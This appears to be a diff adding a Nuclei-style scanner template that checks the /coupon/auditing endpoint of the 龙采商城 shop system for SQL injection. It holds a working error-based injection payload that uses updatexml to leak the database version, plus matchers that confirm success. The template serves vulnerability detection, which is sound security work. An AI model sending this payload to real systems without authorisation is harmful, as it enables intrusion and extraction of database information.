@@ -1,0 +1,29 @@
+id: sql-injection-auditing
+
+info:
+  name: SQL Injection in Auditing Endpoint
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The auditing interface in 龙采/龙采商城系统 is vulnerable to SQL Injection.
+    This allows attackers to inject SQL payloads to retrieve sensitive information
+    such as database version.
+  tags: sqli, high-risk
+
+http:
+  - raw:
+      - |
+        POST /coupon/auditing HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "~"  # Matching the tilde (~) which surrounds the database version in the response
+      - type: status
+        status:
+          - 200
